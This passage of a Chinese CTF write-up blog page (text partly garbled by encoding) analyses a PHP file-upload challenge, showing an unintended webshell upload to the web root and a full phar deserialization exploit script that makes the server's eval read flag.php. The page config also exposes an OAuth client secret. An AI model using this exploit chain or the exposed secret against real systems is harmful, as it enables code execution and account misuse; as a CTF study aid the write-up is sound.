class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹ </p>
<p>åªè¦ç¬¦åˆ<code>preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)</code> <code>$file[&#39;size&#39;] &gt; 1024</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å°±ä¼šè¢«ç§»åŠ¨åˆ°æ–°çš„è·¯å¾„å¹¶ä¸”è¿™ä¸ªè·¯å¾„å°±æ˜¯æˆ‘ä»¬ä¹‹å‰é€šè¿‡getä¼ å‚çš„name</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">      <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">              <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â€²â–½`ã€ƒ)&#x27;);&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜å‰©ä¸¤ä¸ªé­”æœ¯æ–¹æ³•</p>
<p>å¯ä»¥çœ‹åˆ°ææ„å‡½æ•° å­˜åœ¨eval æ‰§è¡Œcmdå±æ€§ ä½†æ˜¯è¿™ä¸ªé¢˜ç›®ä¸å­˜åœ¨ååºåˆ—åŒ–å…¥å£å‡½æ•°</p>
<p>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰æ–‡ä»¶ä¸Šä¼ å•Š å¤ªç»å…¸äº† pharæ–‡ä»¶æ­é…phar://å°±å¯ä»¥è¿›è¡Œååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ok æ€è·¯æ¸…æ™°ï¼</p>
<h2 id="éé¢„æœŸï¼š"><a href="#éé¢„æœŸï¼š" class="headerlink" title="éé¢„æœŸï¼š"></a>éé¢„æœŸï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home.php?file=upload&amp;name=/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p>
<h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£:"></a>é¢„æœŸè§£:</h2><p>è¦æƒ³æ‰§è¡Œeval é‚£ä¹ˆ <code>$this-&gt;token != $_SESSION[&#39;user&#39;]</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$_SESSION[&#39;user&#39;]</code>æ˜¯å¤šå°‘å‘¢ æˆ‘ä»¬å¯ä»¥éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ¥çœ‹å› ä¸ºè·¯å¾„ä¸­å°±ä¼šçˆ†å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689930191463-8262e26e-2d8a-4455-84c1-9ba94f9306b0.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/uploads/d13687f9a4bb80ded57226b5f42f671e/GXY845d6439be6936948e31cbfbbc90a715.txt</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆ<code>$_SESSION[&#39;user&#39;]=GXY845d6439be6936948e31cbfbbc90a715</code></p>
<p>ç„¶åå°±æ˜¯å¾ˆç»å…¸çš„pharé“¾å­æ„é€  å·çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;Filename=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;token=<span class="string">&quot;GXY845d6439be6936948e31cbfbbc90a715&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¸Šå»ä¹‹å åœ¨ç”¨phar://å»è®¿é—®å°±è¡Œäº† è¿™é‡Œå°±ä¸èµ˜è¿°äº†</p>
<p>ç„¶åè¿™é“é¢˜ç›®è¿‡æ»¤é‡Œæœ‰ä¸ªé”™è¯¯</p>
<p> <code>if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;]))</code></p>
<p>ä»”ç»†çœ‹<code>\.</code>å‰é¢æœ‰ä¸ªç©ºæ ¼ æ‰€ä»¥è¿™é“é¢˜åŒ¹é…ä¸åˆ°æˆ‘ä»¬çš„<code>.</code>å› è€Œæˆ‘ä»¬æ‰èƒ½getçš„nameä¸­å­˜åœ¨<code>.</code></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/post/ec342723.html" rel="prev" title="buuåˆ·é¢˜(page 4)">
                  <i class="fa fa-chevron-left"></i> buuåˆ·é¢˜(page 4)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/post/731522c3.html" rel="next" title="DASCTF 2023 & 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ› éƒ¨åˆ†WEBå¤ç°ä¸å­¦ä¹ ">
                  DASCTF 2023 & 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ› éƒ¨åˆ†WEBå¤ç°ä¸å­¦ä¹  <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">é™‡ICPå¤‡2023001761å·-1 </a>
  </div>

<div class="copyright">
  &copy; 2023.2 â€“ 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
</div>



    </div>
  </footer>

  

  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"b3eaf18856fe31065fd35ae0edb86454"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>

